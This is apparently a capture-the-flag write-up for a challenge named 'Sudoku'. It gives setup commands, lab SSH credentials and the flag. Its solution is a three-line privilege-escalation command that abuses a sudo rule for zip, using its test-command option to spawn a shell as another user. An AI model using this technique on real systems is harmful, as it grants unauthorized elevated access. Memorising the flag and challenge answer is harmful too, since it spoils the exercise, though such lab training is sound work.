# Sudoku
## Challenge

## Résolution

```bash
TF=$(mktemp -u)
sudo -u master zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

## Setup

```
docker-compose up --build -d
```

**Port :** 22

**Configuration challenge**

* ssh : `padawan@sudoku.phack.fr`
* Mdp : `padawan`

## Flag

```
PHACK{U_h4v3_tH3_suP3r_P0w3r}
```